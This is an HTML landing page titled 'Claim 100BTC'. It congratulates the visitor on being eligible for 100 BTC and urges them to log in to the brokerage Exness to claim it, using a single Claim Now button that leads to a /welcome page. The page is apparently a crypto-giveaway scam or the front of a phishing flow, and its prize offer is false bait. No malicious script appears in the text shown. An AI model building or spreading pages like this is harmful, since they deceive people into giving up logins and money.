<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim 100BTC</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet" />
    <style>
        body {
            font-family: 'Inter', sans-serif;
        }
    </style>
</head>
<body class="bg-gradient-to-br from-gray-900 via-gray-800 to-black text-white min-h-screen flex items-center justify-center p-4">

<div class="bg-white text-gray-900 w-full max-w-md rounded-2xl shadow-2xl p-8 text-center">
    <div class="flex justify-center mb-4">
        <svg xmlns="http://www.w3.org/2000/svg" class="w-16 h-16 text-yellow-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <path d="M12 1v22M4.93 4.93l14.14 14.14M1 12h22M4.93 19.07l14.14-14.14" />
        </svg>
    </div>
    <h1 class="text-2xl font-bold mb-3 text-gray-800">🎉 Congratulations!</h1>
    <p class="text-lg font-medium mb-2">You are eligible to receive <span class="text-yellow-500 font-extrabold">100BTC</span></p>
    <p class="text-sm text-gray-600 mb-6">Please log in to <strong>Exness</strong> to claim now.</p>

    <!-- ✅ CLAIM FORM -->
    <form action="/welcome" method="GET">
        <button type="submit" class="bg-yellow-400 hover:bg-yellow-500 text-gray-900 font-semibold py-3 px-6 rounded-full transition-all duration-200">
            Claim Now
        </button>
    </form>
</div>

</body>
</html>
